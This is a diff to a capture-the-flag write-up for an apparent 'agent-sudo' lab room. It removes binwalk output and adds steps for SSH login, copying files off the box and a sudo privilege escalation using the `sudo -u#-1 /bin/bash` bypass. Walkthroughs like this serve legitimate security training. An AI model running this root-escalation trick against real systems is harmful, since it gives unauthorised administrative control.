@@ -93,13 +93,6 @@ We need a passphrase, which according to the note is stored in the fake picture.
 
 `binwalk cutie.png -e`
 
-> DECIMAL       HEXADECIMAL     DESCRIPTION
-> --------------------------------------------------------------------------------
-> 0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
-> 869           0x365           Zlib compressed data, best compression
-> 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
-> 34820         0x8804          End of Zip archive
-
 Let's unzip the file that was extracted.
 
 It's password protected. Let's use John The Ripper here to try and crack the file.
@@ -132,4 +125,45 @@ And now we have a "message.txt" file we can read.
 `cat message.txt`
 
 Nice, we have an SSH password now for `james`
+
+`ssh james@10.10.15.235`
+
+We'll quickly grab the user flag from the home directory, and work on the next question.
+
+> What is the incident of the photo called?
+
+The hint says to use "Reverse Image search and Foxnews" so let's go ahead and to that.
+
+Copy the file to our attackbox first.
+
+`scp james@10.10.15.235:Alien_autospy.jpg .`
+
+And let's use https://tineye.com/ to look the image up.
+
+The title of the news article contains the answer to the question.
+
+Now time for privesc...
+
+`sudo -l` to check our sudo privileges
+
+> User james may run the following commands on agent-sudo:
+>    (ALL, !root) /bin/bash
+
+So we can't run /bin/bash as root, but a little googling tells us there's an exploit available for this.
+
+`sudo -u#-1 /bin/bash`
+
+And now we have root.
+
+We'll grab the root flag from the root directory, and work on the bonus question.
+
+> (Bonus) Who is Agent R?
+
+Well, the contents of root.txt end with
+
+> By,
+> DesKel a.k.a Agent R
+
+Boom. Room complete.
+
 
